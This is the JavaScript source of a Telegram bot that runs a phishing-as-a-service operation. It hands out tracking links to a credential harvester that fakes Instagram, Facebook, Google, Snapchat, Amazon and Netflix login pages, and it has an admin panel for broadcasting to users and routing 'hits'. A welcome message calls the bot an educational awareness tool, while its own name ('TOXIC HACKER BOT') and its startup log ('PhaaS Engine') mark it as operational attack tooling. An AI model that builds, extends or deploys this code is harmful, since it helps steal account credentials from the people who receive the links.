const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const HARVESTER_URL = process.env.HARVESTER_URL;
const OWNER_ID = process.env.OWNER_ID; 
const CHANNEL_ID = process.env.CHANNEL_ID;
const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
    console.error("FATAL ERROR: One or more environment variables are missing.");
    process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 300, autoStart: true, params: { timeout: 10 } } });
const DB_PATH = './db.json';
let adminState = {};

// --- DB Functions ---
const readDb = () => {
    if (!fs.existsSync(DB_PATH)) {
        fs.writeFileSync(DB_PATH, JSON.stringify({ users: [], admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_PATH));
};
const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
const isAdmin = (userId) => {
    const db = readDb();
    return db.admins.includes(parseInt(userId));
};

// --- KEYBOARDS ---
const adminKeyboard = [
    [{ text: "📊 User Status", callback_data: "admin_status" }, { text: "📢 Broadcast", callback_data: "admin_broadcast" }],
    [{ text: "🔗 Generate Link", callback_data: "admin_generate_link" }],
    [{ text: "➕ Add Admin", callback_data: "admin_add" }, { text: "➖ Remove Admin", callback_data: "admin_remove" }],
    [{ text: "🚫 Block User", callback_data: "admin_block" }, { text: "✅ Unblock User", callback_data: "admin_unblock" }]
];
const linkGenerationKeyboard = [
    [{ text: '📸 Instagram', callback_data: 'gen_link_Instagram' }, { text: '📘 Facebook', callback_data: 'gen_link_Facebook' }],
    [{ text: '🇬 Google', callback_data: 'gen_link_Google' }, { text: '👻 Snapchat', callback_data: 'gen_link_Snapchat' }],
    [{ text: '📦 Amazon', callback_data: 'gen_link_Amazon' }, { text: '🎬 Netflix', callback_data: 'gen_link_Netflix' }],
    [{ text: '⬅️ Back to Admin Panel', callback_data: 'admin_panel_back' }]
];

// --- /start COMMAND with Elite Welcome Message ---
bot.onText(/\/start/, async (msg) => {
    const userId = msg.from.id;
    const db = readDb();
    if (db.blocked_users.includes(userId)) return;

    try {
        const chatMember = await bot.getChatMember(CHANNEL_ID, userId);
        if (!['member', 'administrator', 'creator'].includes(chatMember.status)) throw new Error("User not in channel");

        if (!db.users.includes(userId)) {
            db.users.push(userId); writeDb(db);
        }
        
        const welcomeMessage = `
💀 **TOXIC HACKER BOT** 💀  
_Your All-in-One Credential Awareness Tool_

*🔐 Access Fake Login Pages for Awareness & Testing:*

🔹 Facebook Login Checker  
🔹 Instagram Credential Portal  
🔹 Snapchat Account Info Viewer  
🔹 Google Sign-in Interface  
🔹 Amazon Login Capture  

*🎯 Purpose:*  
For Educational Use, Cybersecurity Training & Ethical Hacking ONLY!

*⚠️ Disclaimer:*  
This bot is intended strictly for ethical testing, red teaming, and OSINT research.  
❌ _Never use for illegal activities._  
✅ _Use responsibly._
        `;
        
        await bot.sendMessage(userId, welcomeMessage, { parse_mode: 'Markdown' });

        if (isAdmin(userId)) {
            bot.sendMessage(userId, "👑 **Admin Panel Activated** 👑", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else {
            bot.sendMessage(userId, "✅ **Access Granted!**\nSelect a service below to generate your link.", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: linkGenerationKeyboard.slice(0, -1) } });
        }
    } catch (error) {
        bot.sendMessage(userId, `🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: '➡️ Join Channel ⬅️', url: CHANNEL_LINK }], [{ text: '🔄 Joined! Click to Continue 🔄', callback_data: 'check_join' }]] }
        });
    }
});

// --- CALLBACK QUERY HANDLER ---
bot.on('callback_query', (query) => {
    const userId = query.from.id;
    const data = query.data;
    const messageId = query.message.message_id;

    if (data === 'check_join') {
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(userId, "Now please type /start again to verify.");
        return;
    }

    const [type, command, service] = data.split('_');

    if (type === 'gen' && command === 'link') {
        const genService = service;
        const attackLink = `${HARVESTER_URL}/?service=${genService}&uid=${userId}`;
        bot.sendMessage(userId, `✅ **Link for [${genService}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
    } 
    else if (type === 'admin') {
        if (!isAdmin(userId)) return bot.answerCallbackQuery(query.id, { text: "❌ Access Denied!", show_alert: true });

        if (command === 'generate') {
            bot.editMessageText("🔗 **Admin Link Generator**\n\nSelect a service. Hits will be sent to YOU.", { chat_id: userId, message_id: messageId, reply_markup: { inline_keyboard: linkGenerationKeyboard } });
        } else if (command === 'status') {
            const db = readDb();
            const statusText = `📊 **Bot Status**\n\n👥 Users: ${db.users.length}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`;
            bot.editMessageText(statusText, { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else if (command === 'panel') {
            bot.editMessageText("👑 **Admin Panel** 👑", { chat_id: userId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: adminKeyboard } });
        } else {
            const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
            if (prompts[command]) {
                adminState[userId] = command;
                bot.sendMessage(userId, prompts[command]);
            }
        }
    }
    
    bot.answerCallbackQuery(query.id);
});

// --- MESSAGE HANDLER for admin replies ---
bot.on('message', (msg) => {
    const userId = msg.from.id;
    const text = msg.text;
    if (text === '/start' || !adminState[userId]) return;

    const action = adminState[userId];
    delete adminState[userId];

    const db = readDb();
    const targetId = parseInt(text);

    switch (action) {
        case 'broadcast':
            bot.sendMessage(userId, "📢 Broadcasting...");
            db.users.forEach(user => { bot.sendMessage(user, text).catch(err => {}); });
            bot.sendMessage(userId, "✅ Broadcast complete.");
            break;
        case 'add_admin':
            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
                db.admins.push(targetId); writeDb(db);
                bot.sendMessage(userId, `✅ User ${targetId} is now an admin.`);
            } else { bot.sendMessage(userId, "❌ Invalid ID or already an admin."); }
            break;
        case 'remove_admin':
             if (!isNaN(targetId) && db.admins.includes(targetId)) {
                if (targetId.toString() === OWNER_ID) return bot.sendMessage(userId, "❌ You cannot remove the owner.");
                db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
                bot.sendMessage(userId, `✅ User ${targetId} removed from admins.`);
            } else { bot.sendMessage(userId, "❌ Invalid ID or not an admin."); }
            break;
        case 'block':
             if (!isNaN(targetId)) {
                if (isAdmin(targetId)) return bot.sendMessage(userId, "❌ You cannot block an admin.");
                db.blocked_users.push(targetId); writeDb(db);
                bot.sendMessage(userId, `🚫 User ${targetId} has been blocked.`);
            } else { bot.sendMessage(userId, "❌ Invalid ID."); }
            break;
        case 'unblock':
             if (!isNaN(targetId) && db.blocked_users.includes(targetId)) {
                db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
                bot.sendMessage(userId, `✅ User ${targetId} has been unblocked.`);
            } else { bot.sendMessage(userId, "❌ Invalid ID or not blocked."); }
            break;
    }
});


bot.on("polling_error", (error) => console.log(`Polling Error: ${error.code}`));
console.log('🔥 PhaaS Engine (Final, Clean Version) is online.');
